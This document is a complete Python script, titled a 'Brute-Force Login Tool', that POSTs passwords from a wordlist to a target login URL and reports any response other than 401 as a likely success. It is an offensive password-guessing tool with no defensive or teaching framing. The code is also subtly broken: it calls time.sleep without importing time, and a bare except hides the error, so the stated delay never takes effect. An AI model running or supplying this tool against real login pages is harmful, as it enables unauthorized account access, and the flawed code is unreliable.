import utils.transport
import utils.session
import argparse
import requests
import sys

def main():
    parser = argparse.ArgumentParser(description='Brute-Force Login Tool')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-user', required=True, help='Username to test')
    parser.add_argument('-w', '--wordlist', required=True, help='Wordlist path')
    parser.add_argument('-d', '--delay', type=float, default=0.5, help='Delay between attempts')
    args = parser.parse_args()

    try:
        with open(args.wordlist, 'r', errors='ignore') as f:
            for password in f:
                password = password.strip()
                try:
                    response = requests.post(
                        args.url,
                        data={'username': args.user, 'password': password},
                        timeout=3
                    )
                    if response.status_code != 401:  # Customize success condition
                        print(f"\n[!] Potential Success: {args.user}:{password}")
                        sys.exit(0)
                    print(f"Trying: {password}", end='\r')
                    time.sleep(args.delay)
                except Exception as e:
                    continue
    except FileNotFoundError:
        print(f"[X] Wordlist not found: {args.wordlist}")
        sys.exit(1)

if __name__ == "__main__":
    main()